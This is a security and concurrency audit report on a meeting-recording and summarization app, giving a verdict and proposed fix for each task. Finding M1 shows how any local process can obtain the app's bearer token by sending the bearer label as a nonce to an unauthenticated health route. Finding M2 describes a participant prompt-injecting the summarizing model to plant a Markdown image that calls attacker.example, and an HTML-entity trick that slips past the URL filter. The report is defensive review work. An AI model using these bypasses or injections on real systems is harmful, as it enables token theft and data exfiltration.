**SEC36 (`546563b1`), no speech-model download for a zero-egress job: holds.** `runner.transcribe` has one caller (`SinkDispatcher`), and the preflight sits ahead of it and of the SEC37 trim read, composing the sidecar posture (fail-closed on unreadable) with the live global flag. `ensureAsr`/`ensureDiarizer` are the only fetch sites outside the explicit `prefetch-models` command. The corrupt-cache refetch inside FluidAudio is a written residual, honestly labelled.

**SEC37 (`3c6b0efe`), held-end trim through `MeetingMetaRead`: holds.** The trim is read once before the pass as a three-way `Lookup`, unreadable throws before any `<stem>.json` write and logs `held_end_trim_unreadable`, and the tests would fail against the old `try?` reader. Reading before the pass means a trim edited mid-pass is applied stale, which is harmless.

### Findings by severity

#### M1 (medium). SEC27: the bearer token is derivable from the unauthenticated health route

- Files: `pipeline/src/mp/local_server.py` `bearer_for`, `health_proof`; `pipeline/src/mp/local_model_server.py` `install.do_GET`, `_NONCE_RE`.
- Snippets: `return hmac.new(token.encode("utf-8"), b"mp-local-server-bearer-v1", hashlib.sha256).hexdigest()` (bearer) and `return hmac.new(token.encode("utf-8"), nonce.encode("utf-8"), hashlib.sha256).hexdigest()` (health proof), with `_NONCE_RE = re.compile(r"^[A-Za-z0-9_-]{16,128}$")`.
- The constant `mp-local-server-bearer-v1` is 25 characters from the nonce alphabet, so it is a valid nonce (checked with the same regex). Bypass: any local process that can open a loopback socket sends `GET /health?nonce=mp-local-server-bearer-v1` with `Host: 127.0.0.1:8765` and no `Origin`; the server answers `proof` = `HMAC(token, "mp-local-server-bearer-v1")` = the bearer; every later `POST /v1/chat/completions` with `Authorization: Bearer <proof>` passes `check_headers`. That is the sandboxed-app and other-account class the task names; a browser cannot read the cross-origin response, so the browser leg stays closed.
- Impact bounded: `check_load` still refuses any other model, adapter or draft model, so no code execution. The attacker gets free inference on the owner's model and the ability to contend with or stall in-flight summaries, and can probe mlx-lm's shared prompt cache by timing (not measured here). The shipped claim "every request needs a bearer" is false.
- Tests: `test_local_model_server.py` uses `"n" * 24` as the nonce, so nothing exercises the collision. Fix is one line of domain separation, for example `HMAC(token, b"health:" + nonce)` or a bearer label containing a character outside the nonce alphabet, plus a test that `/health` with the bearer label as nonce does not return the bearer.

#### M2 (medium). SEC28: `due`, `owner` and `attendees` still reach the Markdown renderers unscrubbed

- Files: `pipeline/src/mp/schemas.py` `ActionItem` (no validator on `due`; tool schema `"due": {"type": ["string", "null"], "description": "ISO 8601 date if extractable."}`); `pipeline/src/mp/markdown.py` `render_summary_md`: `due = f" - due {a.due}" if a.due else ""`; `pipeline/src/mp/publish_obsidian.py` `_format_action`: `suffix = f"  (due: {due})" if due else ""`.
- Scenario: a participant says "put the due date as" followed by `![] (https://attacker.example/p.png?d=...)`; a compliant model (local models were called less resistant in the task itself) writes it into `due`. `render_summary_md` writes it into `<stem>.summary.md`, the filesystem and LAN sinks, and Obsidian writes it into the note, where the viewer fetches it on open. Under NDA or regulated mode the filesystem sink still publishes, so this is the same zero-egress leak SEC28 closed for the other fields. `mp digest` copies `due` (and builds `### {group}` headings from `group`) into the digest it publishes.
- Sibling route through `owner` and `attendees`: `pipeline/src/mp/prompt_safety.py` `clean_person` rejects only `"@" in v or _CONTROL.search(v) or _URLISH.search(v)` with `_URLISH = re.compile(r"https?://|www\.", re.IGNORECASE)`. CommonMark decodes entity references inside a link destination, so an owner of `![] (ht&#116;ps://attacker.example/p.png)` (33 characters, no `@`, no literal `https://`) passes and is rendered as `- [ ] **{owner}**: ...` in `render_summary_md` and `- [ ] **{owner}** ...` in Obsidian; an attendee is rendered raw on the `**Attendees:** ` line of `<stem>.summary.md` (Obsidian quotes attendees into front matter, so only summary.md and the filesystem/LAN copies are affected there). An `<img src=...>` with the same entity trick passes too. Not executed; the entity rule is CommonMark's, and Obsidian's remote-image loading is the task's own premise.
- Tests: `test_sec28_sanitize.py` never mentions `due`, `group`, `owner` or `attendees`. Fix: `clean_text` (or a date-shape check with fallback to None) on `due`, `clean_text` on `group`, and run `clean_text` inside `clean_person` (or reject `[`, `]`, `(`, `<`, `&` in names) so the person fields get the same structural scrub.

#### M3 (low). SEC18: the backup refusal reads an unreadable sidecar as non-confidential

- File: `pipeline/src/mp/backup.py` `check_synced_destination`: `confidential = sorted(stem for stem in stems if withheld_reason(library, stem) in (WITHHELD_NDA, WITHHELD_REGULATED))`.
- `visibility.withheld_reason` goes through `workflow.read_meta`, which returns `{}` for an unreadable sidecar, so the stem reads `no_sidecar` and is ignored here. Everywhere else since SEC25 an unreadable sidecar is treated as NDA (`workflow._fail_closed`, `MeetingMetaRead.isZeroEgress`).
- Scenario: the owner's library is in iCloud Desktop & Documents, the documented trigger for a dataless `meta.json` (EDEADLK, 2026-10-16). A library whose only NDA meeting has an evicted sidecar backs up to a synced destination without refusal, and the archive carries that meeting's audio and transcript. The docstring's reasoning ("`no_sidecar` meetings are unknown rather than confidential") is fine for absent sidecars but conflates the unreadable case. Fix: use `workflow.load_meta` and count `unreadable` as confidential.

#### L1 (low). SEC35 after SEC18: doctor walks the LAN mount and keeps a stale FAIL rule

- File: `pipeline/src/mp/doctor.py` `_synced_roots`: `roots.append(("LAN share", Path(cfg.lan.mount_path), cfg.modes.regulated_mode and "lan" in global_sinks))`, then `cloudsync.detect_sync_provider(path, home=home)` on every root; `_folder_has_files` runs `rglob("*")` over the published folder.
- SEC18's `_local_target` comment says LAN is excluded because "`detect_sync_provider` walks every ancestor with `listxattr`, which a stale SMB mount can hang". Doctor now does exactly that walk on the mount, so `mp doctor` (and the daemon's doctor spawn) can hang on a stale share. Separately, the FAIL for a synced vault or share under regulated mode is stale: SEC18 removed both sinks from every zero-egress run, which the SEC35 spec itself said should make them WARN-only.

#### L2 (low). SEC18: a second copy of the sink rule survives in `_fail_closed`

- File: `pipeline/src/mp/workflow.py` `_fail_closed`: `overlay.output.sinks = ["filesystem"]` (and `overlay.summarization.backend = "local"`).
- The ship note says relaxing the rule is "one edit in `config.effective_sinks`" plus the golden table and Swift. If the owner answers the open question by keeping Obsidian, unreadable-sidecar meetings stay on the old rule, and the golden test does not cover `_fail_closed`. Harmless today; replace with `effective_sinks(overlay)` after setting the NDA flag.

#### L3 (low). SEC32: the spike's "10 of 10" is narrower than its write-up implies

- Files: `pipeline/scripts/sec32_kernel_egress_probe.py` `CASES`, `PROFILE`, `_classify`, `_summary_leg`; `docs/spikes/sec32-kernel-zero-egress.md` "What a kernel deny cannot see".
- Every case connects from the confined tree to `192.0.2.1`. None covers delegated egress (a hypothesis from reading the profile, not tested; I did not run anything under the profile), which `(allow default)` plus `(allow network-outbound (remote ip "localhost:*"))` leaves open: `open https://...` through Launch Services, any Mach/XPC service that fetches on the caller's behalf (for example a URL session daemon), or a loopback relay (a local proxy or VPN client) that the localhost allow admits. The doc's cannot-see list names policy-layer, file-mediated and daemon egress but not these, so a PASS would be read as "the pipeline cannot egress".
- `_summary_leg` runs `--runs 1` per arm, open first then profile, so the profile arm benefits from a warm page cache and the 5% threshold sits inside single-run noise, biased toward PASS. `_classify` also counts `EACCES` and any "operation not permitted" text as kernel-blocked (`if isinstance(seen, OSError) and seen.errno in (errno.EPERM, errno.EACCES)`), while the doc and the task's Progress note fix the definition as EPERM only. The added NOT PASS row shares a commit with the smoke result, so its pre-registration is asserted, not shown.
- Suggested before the owner reads a verdict: add an `open`/Launch Services case and a loopback-relay case, add the delegated-egress line to the cannot-see list, and run the summary leg with several alternating runs.

#### Informational

- SEC27: the token record is cleared only by `atexit`, which does not run on SIGTERM or SIGKILL, so a stale `mlx-server.token` survives every kill. Harmless (a squatter still cannot compute the proof), but `clear_marker` does not remove it either.
- SEC18: `CloudSecretPolicy` outside zero egress hands an `openai` run the Anthropic key and an `anthropic` run the OpenAI key; with `load_secrets` refilling anyway this is cosmetic, but it is not the least-privilege policy the doc comment describes.
- SEC20: each run's fresh cwd adds a project entry to `~/.claude.json` (the author flagged this for the owner check).
- SEC23: if `security -i` ever echoes a failing command line to stderr, `KeychainError.commandFailed(stderr)` would surface it in the Preferences error; not verified, low likelihood.
- SEC33: a literal `{}` sidecar is withheld by Python and shown by Swift.

### Composite pass

**One zero-egress predicate per tree, and do they agree?** Python: nearly. `config.zero_egress` (`cfg.modes.regulated_mode or cfg.modes.workflow_nda_mode`) is the run-config owner: `effective_backend`, `effective_sinks`, `egress_guard.arm_for_config` (which arms the httpx patch, pops all four managed keys and pins Hugging Face offline), `child_env`, BYO and the synced-target gate all key off it, and `apply_overrides` feeds it. A grep of `pipeline/src/mp` for direct reads of the two flags finds the side owners: `visibility.withheld_reason` per meeting (by design), doctor's library-wide `zero_egress_promised = regulated_mode or any NDA workflow` (by design, different question), the hard-coded sinks in `_fail_closed` (L2), and `publish_from_paste` checking `cfg.modes.regulated_mode` alone, so an NDA (non-regulated) paste still publishes, through `effective_sinks`, i.e. to the filesystem sink only (pre-existing, not in this batch). None of the twelve commits added a new copy on the Python side. Swift: no, there is still no single predicate. `regulated || nda` is computed separately in `CaptureMode.resolve`, `RegulatedMode.effectiveBackend`/`effectiveSinks`, `PipelineLauncher.cloudSecretPolicy`, `MeetingMetaRead.isZeroEgress`, `Meeting.isZeroEgress`, and now SEC36's `MeetingMetaRead.load(...).isZeroEgress || globalRegulatedMode()`. I checked the four sidecar states against Python (absent: global config only on both sides; loaded: NDA or sidecar `regulated_mode` on both; unreadable: zero egress on both; non-object JSON: unreadable in Swift) and they agree today. The sink rule is the only one pinned cross-tree by a shared fixture; the posture predicate is not.

**Can regulated or NDA data reach a cloud backend, a synced folder, a log or argv?** Cloud backend: no new route found. `claude_cli` refuses armed runs, the local server is loopback-only and offline, and SEC36 stops the daemon's model fetch. Synced folder: yes, by three routes. The library `raw/` itself (by design, warning only), a synced backup destination when the NDA meeting's sidecar is unreadable (M3), and a Markdown sink rendering a model-planted remote image through `due`, `owner` or `attendees`, which fetches from the viewer when the filesystem note opens (M2; that one is egress from the reader rather than a sync). Logs: the new log lines carry paths, stems and provider names, not titles or content. Argv: closed for tokens (SEC23 stdin, SEC27 env), for prompts (SEC20 stdin) and for the model server (a snapshot path). One untouched route stays open and interacts with SEC27: security-review finding 8 (the loopback httpx client honours an ambient `HTTP_PROXY`, and the guard checks only the URL host) belongs to SEC19, which did not land in this batch, so with a proxy in the environment the transcript and now the bearer travel to the proxy.

**Did SEC27 or SEC20 break the egress guard or the PIPE22/36/37 shutdown paths?** Not that I can find. SEC27 runs mlx-lm in-process inside the shim, so the spawned pid is still the server; `is_server_command` accepts the shim's name on both trees (`LocalServerReaper.isServerCommand` updated), the LOCAL10 marker and PIPE22's kill ladder (`killpg`, keep the marker on a survivor) are unchanged, and `server_env` starts from `egress_guard.child_env()` before stripping. A foreign listener is refused without being killed, which preserves PIPE22's rule against killing another owner's server. SEC20's child runs under `subprocess.run`, which kills it on any exception (including PIPE22's SIGTERM unwind) before the temp directory is removed, and it stays in mp's process group for the daemon's group kill.

**Is SEC32 honest about what it proved?** Mostly. It is explicit that only the bypass half was smoke-tested by an agent and that the verdict needs the owner's summary leg. It overstates scope in one place (delegated egress is not in the ten and not in the cannot-see list) and its overhead measurement cannot resolve the threshold it pre-registered (L3).

## Area report: recorder and concurrency

Read-only review at the pinned commit `78b72306`. Every claim below was read in code at that pin; commit messages, comments and ship notes were treated as claims. Nothing was built or run.

### Verdicts

| Task | Verdict |
|---|---|
| REC18 | holds |
| REC21 | holds |
| REC22 | holds |
| REC30 | holds |
| REC32 | holds with gaps |
| REC34 | holds |
| PERF28 | holds |
| CONC11 | holds |
| CONC5 | holds with gaps |
| CONC6 | holds |
| CONC7 | holds (tests cannot see the race) |
| CONC8 | holds |
| CONC12 | holds |
| DET21 | holds with gaps |
| DET23 | holds |

**REC18 (`1e81bb7f`): holds.** `MicLevelMonitor` and its engine are gone; `MicActivityPulseView` is driven from `MeetingDiscoveryWatcher.onMicBusyBundle`, which is called on main from the KVO hop and `sampleMicBusy`, so `setMicBusy` touches AppKit on main. The prompt opens no device on any route. The no-engine acceptance is a source fence (no seam exists, and the test says so); the pulse decision is a real pure test. Gap worth knowing, not a defect: the pulse reads DET3's mic-busy signal, which DET23's own context says never read true on the work laptop (D082), so on that machine the pulse will likely rest dim for every prompt.

**REC21 (`a54d206c`): holds.** Markers are written checked and reported (`start_marker_write_failed`), the manifest carries `capture_mode` and `off_record`, the job carries `redactionOwed`, and `RecordingManifest.load` tells absent, unreadable and parsed apart, with unknown `summary_mode` tokens and a wrong-typed `meta` read as unreadable (F148). F026 is closed: `recover` now moves first and calls `cleanupStartMarkers` only once the move landed, and a failed move keeps the markers for the redactor and the manifest for `retryMeeting`, which refuses an unreadable one. F164 is closed in `StrandedJobRecovery.isFinalWav`. The tests are behavioural (unwritable originals directory, torn manifests, a Retry carrying a manifest-only debt) and would fail on the pre-fix code. See finding L5 for one side effect of `persistOwed`.

**REC22 (`8b88a7f9`): holds.** `WriteFailureTracker` counts every failure and keeps the first error; `WriteFailureLedger` takes a lock only around the tracker mutation and calls `react` outside it, so no callback runs under the lock. Totals are read after `drainWriters` and skipped on a wedged drain; system ledgers are kept per writer so a reopened file adds rather than replaces. `onWriterBacklog` fires from the main-queue liveness tick and `handleWriterBacklog` guards on `.recording`. Tests are pure and would fail pre-fix.

**REC30 (`ed2557e3`): holds.** First/last buffer uptimes and delivered seconds are stamped on the converted file-format buffer (so device-change resampling does not skew them), the span is taken in `endSession`, and both `intermediate_durations` and the parity check use it instead of a post-merge `Date()`. `channel_coverage_short` and the `partlyMissing` notice behave as specified. The recorder half is pinned by a pure verdict plus a source fence, as stated. The coverage check never runs on orphan-recovered recordings (see M1).

**REC32 (`9008fab5`, `00a8ebc0`, `ea695885`): holds with gaps.** The after-job reap moved to `onJobSettled`, and the no-final stop branch calls `requestOrphanSweep()` after `recorder.stop` returned, so the banner's "recovered automatically" is now true with an empty queue (except while an abandoned drain still owns the stem, where it waits for the next settled job, as the comment says). `orphan_stale_found` is once per process. Recover writes `.recover-requested` and goes through the normal recovery path; Discard moves to `originals/held` through `MuteRedactor.quarantine`, which never deletes. Gaps: L3 (Recover routes manifest-less stems to the `.auto` cloud path for all stale stems at once), L4 (an immediate re-merge after a killed stop merge), and M1 (the recovery path it now uses more often drops the head offset).

**REC34 (`19057e07`): holds.** `MuteTimelinePersistence` is the one span rule; `persistAfterMerge` writes the timeline with or without a final and still removes `.capturemode` only on a usable final with a landed timeline; the termination flush writes only when the teardown was clean and no device recovery is in flight (`deviceRecovery.recoveryTask == nil`), before the drain. Recovery then lands such a stem in `ready` and the redactor cuts it. Call sites are pinned by source fences (the recorder cannot run headless), the shared rule and the quit-then-recover path by behavioural tests. The documented residue stands: `stop()` still reads `muteTimeline` after a timed-out teardown.

**PERF28 (`13806a92`): holds.** The marker, mic file create and manifest run off main through `RecordStartFileWrite.run`, which hands the result back through one locked slot with exactly one owner; an abandoned create holds its stem (`RecordingStemOwnership.hold`) until it has deleted its own file, so the sweep cannot meet a header-only `.mic.wav`. The manifest await sits before `startLatch.resolve()`, keeping REC7's no-suspension span. Item 5 (prewarm) is owner-gated by design. REC21 later added two synchronous writes on main in the same spirit PERF28 removed (L5).

**CONC11 (`38c41441`): holds.** Both format reads return `InputFormatValues` and the main actor rebuilds the format; no `@unchecked` or `nonisolated(unsafe)` was added for it. One plausible, unverified risk is L6 (a multi-channel device whose layout uses channel descriptions is rebuilt as `DiscreteInOrder` and handed to `installTap`).

**CONC5 (`965b6da3`): holds with gaps.** `ProcessRunner` drains both pipes while the child runs, signals only a running child, escalates SIGTERM then SIGKILL on the calling thread, and reports `reaped`; the merge's 300 s is now a real kill and a killed merge never reaches `promoteMerged`; a timed-out redaction is `.failed(.ffmpegFailed)` and its temp is removed only after reap; `StorageJanitor` serialises and coalesces the reap with a fresh snapshot per run. The remainder is recorded honestly in the task (scheduler, two-phase stop canary, launch Keychain reads still on main and now bounded at about 16 s each, unmigrated sites). New defect: L1, a `ps` that times out reads as a dead owner and kills a live summary's server.

**CONC6 (`78b72306`): holds.** The three `SystemAudioCapture` statics sit in one `OSAllocatedUnfairLock`, the observer slot is claimed under the lock before registering, and no lock is held across an await. `assertMainQueue()` is debug-only and found a real off-main write (`writeRecoveryManifest`, now `@MainActor`). Level callbacks are locked and read once per emit; first-fired lines use `writeLineAsync`. The AX handler boxes are entry-owned and released on main after `removeSource`, which orders after any callback already running on main. TSan runs are reported clean.

**CONC7 (`753743cd`): holds, but its tests cannot see the race.** `ProcessOutputDrain` finishes only on exit plus EOF on both pipes (or the 2 s post-exit ceiling), delivers chunks on one serial queue, and clears handlers after EOF; `runMP` and `DoctorRunner` use it and a failed spawn releases its slot and descriptors. The commit itself says a 50-run baseline on pre-fix code dropped 0 of 50 last lines, so the new tests pass on the old code for the main defect; the fix is pinned by construction only. The descriptor and supervisor tests are real.

**CONC8 (`0b7e3fcd`): holds.** `DebouncedSaver` snapshots on main, writes on its own serial queue and reports back on main; `SecretsStore` no longer spawns `security` on main and only touches `persisted` under `snapshotLock`. `saveNow` and `flush` block main through `queue.sync`, but `SecretsStore.saveNow` has no production caller and `GlossaryStore.flush` writes a file, not a Keychain item. Minor: the pipeline's `_ABSENT_SECRETS` is per process, so a long-lived `mp` (the MCP server) does not see a token added after it started until restarted.

**CONC12 (`0cb47267`): holds.** `PermissionsCenter` is `@MainActor`, so every async probe commits on main. The three `MainActor.assumeIsolated` readers are reached only from menu-open delegates, `DispatchQueue.main.async` repopulates and `Coordinator.start`; `rebuildMenu` only stores state, so no background path reaches `menuInputs`. The trap would fire in release too, so this is worth keeping fenced, but I found no off-main route today.

**DET21 (`92411749`): holds with gaps.** One backend listener per address with an epoch-tagged fan-out; system-object listeners kept for the daemon's lifetime, others removed with their status logged; subscribers hop off the bus queue with `async` only, so there is no bus-queue / signal-queue inversion. Re-resolves are coalesced (250 ms), diffed, summarised in one row, and backed off when unresolved. The finding's storm mechanism is gone. Gap M2: the bus-level epoch guard silently drops exactly the leaked-listener deliveries that `stale_delivery_count` is meant to reveal, so the owner's field check cannot detect a leak.

**DET23 (`59c49911`): holds.** `MicHolderMonitor` reads the process-object list at 1 Hz on its own utility queue, caches identity per object, shares DET21's list listener through the bus, publishes a locked snapshot, and is log-only. Feeds from the session (`setRecording`, `noteLevels`) are main-to-queue async and generation-checked, so a level queued after disarm is ignored. The decision to poll at a fixed 1 Hz for the daemon's lifetime with no consumer yet is the spec's; see L7 for the cost and the missing exit criterion.

### Findings by severity

No critical or high finding survived reading. Two medium, seven low.

#### M1 (medium, pre-existing, amplified by REC32 and REC34): orphan recovery merges with no head offset and no held-end trim

`RecordingPostProcessor.recoverOrphan`:

```swift
guard await produceFinal(
    mic: micURL, system: systemURL, final: finalURL, hasMic: hasMic, hasSystem: hasSystem
) else {
```

`produceFinal` defaults `systemHeadOffsetSec: Double = 0` and `limitSeconds: Double? = nil`. The head offset (REC9) exists only in the recorder's memory at stop, and nothing persists it for the orphan path. Failure scenario: a recording whose system channel started 4 s late (the field p90 is 4.24 s, the max 33.21 s) is quit mid-call while an off-the-record span is open. Before REC34 it was quarantined; now the flush writes its timeline and the next launch recovers it through `recoverOrphan`, which places the far side at t=0, 4 s earlier than it happened, so the transcript interleaves the other side's turns ahead of the owner's replies. The same applies to every no-final stop that REC32 now sweeps at once, and REC30's coverage check never runs on these. Smallest fix: write `systemHeadOffsetSec` (and the trim) into the `.recordfail.json` breadcrumb at stop and into the manifest or a small sidecar in `flushIntermediatesForTermination`, and pass it through `recoverOrphan`.

#### M2 (medium, DET21): the epoch guard hides the leak the field check is meant to see

`CoreAudioHALBus.deliver`:

```swift
guard let listener = listeners[address], listener.epoch == epoch else { return }
```

A HAL block from an earlier registration (the leak D057 describes, which the HAL's `noErr` on every removal cannot rule out) reaches this guard and returns without counting. `noteStaleDelivery` is called only by the subscriber-side generation guards, which an old-epoch block never reaches. Failure scenario: a device mute listener's removal silently fails, the address is re-registered under a new epoch, and the old block keeps firing on every mute change; `unsubscribe_failed` stays at zero (the HAL said `noErr`) and `stale_delivery_count` stays at zero, so walkthrough step 3 passes with the leak present. One line closes it: call `noteStaleDelivery(source: "bus_epoch")` in that branch.

#### L1 (low, CONC5): a `ps` timeout reads as a dead owner, and the reaper kills a live server

`LocalServerReaper.commandLine(of:)`:

```swift
guard result.launchFailure == nil, result.reaped, !result.timedOut else { return nil }
```

`isOwnerAlive` is `isOwnerCommand(commandLine(of: marker.ownerPID))`, and nil means "dead". Failure scenario: `ps -p <owner>` stalls past 5 s (the case the new bound exists for) while an `mp` run is mid-summarize on the local backend; `reapIfOrphaned` reads the owner as gone and sends SIGTERM, then SIGKILL, to the server that run is using, so the summary fails. The same nil on the server check deletes the marker of a live server, which then is never reaped. Unknown should skip the reap, not decide it.

#### L2 (low, CONC5 remainder, now reachable): the 90 s stop canary fires inside a healthy 300 s merge

`StopStallWatchdog.defaultCeilingSeconds` is still 90 while the merge is now a real 300 s bound plus a 10 s kill grace plus drain slack. A healthy merge slowed past 90 s posts "stuck" for a stop that then finishes. Recorded as remainder item 2 in the task; listed here because CONC5 made the 300 s real.

#### L3 (low, REC32): Recover sends manifest-less stale stems down the `.auto` path, all at once

`menuRecoverStaleRecordings` marks every stale stem; a stale stem by definition has no `.recovery.json`, so `recover` gives it `manifest.parsed?.summaryMode ?? .auto` and no sidecar. Failure scenario: one of three stale stems was a BYO or NDA meeting from before REC2 or whose manifest write failed; one click summarises and publishes it with the default workflow. The owner chose the surface, but the row offers no per-stem view and says nothing about routing. Either route manifest-less recovered stems on-device only, or say so in the submenu note.

#### L4 (low, REC32 with CONC5): an immediate re-merge after a killed stop merge

The no-final branch requests a sweep right after `recorder.stop`. When that stop's merge was killed at the 300 s ceiling, the sweep starts another merge of the same inputs at once, and REC24's cap allows the attempts back to back: minutes of ffmpeg on a disk or file that just wedged one. Bounded, so low; a short delay or skipping the immediate request when the breadcrumb's reason is a timeout would avoid it.

#### L5 (low, REC21 against PERF28): two new synchronous writes on main, and `.offrecord` now means "owed" for every redact-opt-in recording

In the clean stop path:

```swift
if !redactionOwed || OffRecordMarker.persistOwed(forFinal: file) {
```

`persistAfterMerge` has already removed `.capturemode` on a clean finish, so for every `.captureFirstRedact` recording `persistOwed` finds no marker and writes `.offrecord` on main; `toggleOffTheRecord` also rewrites the manifest on main. PERF28 moved start-time writes off main because the recordings folder sits under iCloud-synced `~/Documents`. No correctness failure (the job removes `.offrecord` after the cut), but a slow File Provider can stall main at stop, and the marker's meaning has widened from "an off-the-record span opened" to "a cut is owed", which the next reader of `OffRecordMarker` should know.

#### L6 (low, plausible, unverified, CONC11): a rebuilt multi-channel format may not match the input node

`InputFormatValues.makeFormat()` drops a `kAudioChannelLayoutTag_UseChannelDescriptions` layout and rebuilds three or more channels as `DiscreteInOrder`. That format is then the tap format. If AVAudioEngine compares the layout and not only the rate and channel count, an aggregate or pro interface that worked before would now hit `GuardedTapInstall`'s refusal and fail the start. Worth one check with a multi-channel input before closing.

#### L7 (low, DET23 decision): permanent 1 Hz HAL polling with no exit criterion

The monitor runs a 1 Hz `DispatchSourceTimer` (100 ms leeway) plus a 5 s watchdog from launch, on battery and idle alike, and each tick is one list read plus two or three property IPCs to `coreaudiod` per attributed object; nothing consumes it yet. The field bars measure CPU, not wakeups. The spec asked for this, and polling is defensible given how unreliable the listeners proved (DET21), but the walkthrough says what to record if a bar fails and not whether the monitor then stays on. Suggest the walkthrough name a decision (keep, slow when idle, or remove) after the 10 days.

### Composite pass

**Start.** Stem claimed (REC23), `.capturemode` written off main and reported on error (PERF28, REC21), format read as plain values (CONC11), mic file created off main with an ownership hold on abandon (PERF28), engine and SCStream up, then the manifest off main with `capture_mode` and `@MainActor` isolation (PERF28, REC21, CONC6), then the latch resolves and `setRecording` commits with `redactionOwed` set and the level mirror armed (DET23). An orphan sweep, now requested far more often (REC32), excludes owned stems at recover time and stale-stem actions filter by a 24 h age, so a sweep cannot take a starting stem. A Stop during the bounded awaits lands in the latch as before.

**Write.** Capture threads take no file-log lock (CONC6), write failures are counted under a per-writer lock with callbacks outside it (REC22), and coverage stamps are single-writer stores (REC30).

**Stop and merge.** Span taken first (REC30), drain then write report (REC22), merge through `ProcessRunner` with a real kill (CONC5), timeline written with or without a final (REC34), `.capturemode` kept unless the final and timeline both landed, ownership released last. The session then posts the coverage notice (REC30), enqueues with `redactionOwed` and writes the debt to disk before dropping the manifest (REC21), or on a failed merge keeps everything and requests a sweep (REC32). The 90 s canary is the one piece that does not compose with the new 300 s kill (L2).

**Recovery.** The sweep reads the manifest three ways, quarantines on unreadable or owed-with-no-timeline, moves before clearing markers, and a failed move leaves the redactor and `retryMeeting` holding (REC21). A REC34 timeline turns an off-the-record quit into a redacted recovery. What does not compose is the merge on this path: no head offset, no trim, no coverage check (M1), and that path now carries more recordings than before.

**Locks and queues.** No inversion found. The HAL bus queue only ever hops to subscriber queues with `async`, and subscribers call the bus with `sync` from their own queues (`HALSystemMuteProbe`, `ProcessAudioSignal`, `MicHolderMonitor`), so the order is always subscriber then bus. `RecordStartFileWrite`, `WriteFailureLedger`, `SystemAudioCapture.shared`, `StaleOrphanReport` and the level-callback locks hold no callout and no await. `RealAXBackend` calls `removeSource` under its `NSLock`, as it did before; the box release is now ordered on main behind any running callback. `StorageJanitor` blocks only its own serial queue, and `ProcessRunner.runAsync` keeps every blocking wait off the cooperative pool. The remaining main-thread waits are bounded and known: launch Keychain reads (about 16 s worst case each, CONC5 remainder), `GlossaryStore.flush` on Preferences close, and `MicHolderMonitor.stopAndFlush` at quit (0.5 s).

## Area report: simpler fixes

Pinned commit 78b72306, read only. Nothing built or run. Verdict scale: holds / holds with gaps / does not hold / regression. No task failed outright and none is a regression of what it replaced. Every "partial" status in the task headers is honest, and the four tasks marked done (SEC31, FEAT24, PIPE41, REC31) are done for the scope they specify.

### Verdicts

**PERF9 (45455208): holds with gaps.** The List is replaced by a ScrollView over a LazyVStack with pinned headers, sections are built once in recomputeDerived (key includes the pinned inputs), the glyph is a plain SwiftUI Image, and the whole-list animation is gone. Selection rules (click, Cmd, Shift range, arrows, Select All) are a pure struct with 9 tests that restate the intended behaviour. The acceptance number (main busy at most 25%, no _uncachedAutomaticRowHeight frames) was not measured and is the actual claim of the task, so the finding is mechanism-removed-by-construction, not measured. Known open items in the task file (selected row hiding under the pinned header on Up, .draggable swallowing glyph clicks, no Home/End/PageUp/PageDown) are real risks I could not rule out by reading.

**PERF11 (50e1eded): holds with gaps.** The pure StallDetector and the 100 ms log / 250 ms over_budget thresholds match the amendment, and the watchdog emits only from a utility queue after the ping runs. The mechanism undercounts by design: a 4 Hz ping with a 100 ms threshold only catches a stall of duration D with probability about D/250 ms and measures only its remaining part, so most of the 100 to 250 ms stalls the audit wanted named are missed or reported short, and the 3 s freezes are reported as a lower bound. The integration test runs at a 50 ms interval and a 300 ms threshold, so it does not exercise the shipped configuration and does not assert the spec's duration of at least 400. last_ui_seq is correctly deferred to OBS7.

**PERF12 (01590759): holds with gaps.** The play head moved onto a PlaybackClock owned by the controller; the detail pane (which holds the controller via @StateObject) no longer re-renders per tick, and the only remaining consumers of currentTime are the views that draw time. The test asserts the publishing contract (controller objectWillChange 0, clock 30) rather than counting body evaluations, which is a fair proxy. The third scope item (transcript marker map and segment order cached in @State) is not done and the task says so.

**PERF30 (de98f5fb): holds.** The list derives from the typed text and merges FTS rows only when settled for exactly that text. The pure function is right and tested. The test for the full flow re-implements the view's derive in a local closure, so reverting the one wiring line in recomputeDerived would not fail any test (low).

**PERF31 (d40fec24): holds.** The recent-meetings listing runs on countQueue per open and at launch, the submenu reads only the cache and refills in place when the stems change, and the sort reads each mtime once. Tests cover once per open, off main, empty row, and refill. First open right after a launch whose prime has not landed shows "No recent meetings" for a moment before the in-place refill (accepted).

**DIST8 (c2815172): holds.** rm of Application Support/MeetingPipe moved into the --purge branch; the confirm runs before any bootout or rm; no TTY without --yes exits 2 with nothing touched; the test runs the real script in a scratch HOME with stubs and a pty. SETUP.md and README text match the script. The default run still deletes the logs folder (events.jsonl and the daemon logs), which the task scoped as rebuildable (low).

**SEC17 (6e801020): holds with gaps.** Hardened runtime plus an audio-input-only entitlements file is applied in sign_app_with_resources, with a sanity check, and a DYLD injection test shows the pre-change signature loads the library and the hardened one does not. I found no Apple Events, EventKit or Contacts use in the daemon, so the single entitlement looks sufficient. The key half is only partly closed: new keys are imported with -T /usr/bin/codesign, but the owner's existing key keeps the -A ACL until the owner does four Keychain Access steps, and even a -T key is usable by any same-user process that runs codesign, which the commit and dev-cert.sh say plainly. The relocation test signs ad hoc, so the real self-signed-cert launch under hardened runtime is unverified until the owner walkthrough. Python side (absolute lsof and mdfind, claude from fixed dirs before PATH) is correct and small.

**SEC21 (e5a93c66): holds with gaps.** The matcher reports its reason, broken and mistyped workflow files stay visible (rail row, load_skipped event, doctor FAIL), blank rules read as matching nothing everywhere, an uncompilable regex cannot be saved, and meeting_title_unresolved plus nda_classification_undecided are logged. By the owner's decision (2026-11-16) an undecided NDA classification changes no posture, so the title's fail-open is intentionally still true; the code and caption say so. Items 4 (re-stamp on NDA turn-on) and 8 (title from the matched browser window) are not done. One new defect: see finding 7.

**SEC22 (d737e419): holds with gaps (pipeline half only).** Voiceprint, roster, per-meeting embeddings and roster_cmd rewrites now go through atomic 0600 writes, the config dir is created or tightened to 0700, and a fence test rejects hand-rolled temp-and-replace writers. Not done and stated: install.sh chmod, all Swift items, the retention drop of embeddings (item 5), the zero-egress gate (item 6). The forget cascade is opt-in (--purge-embeddings) and nothing in the app passes it, so the person-removal control still leaves that person's vectors in every meeting sidecar.

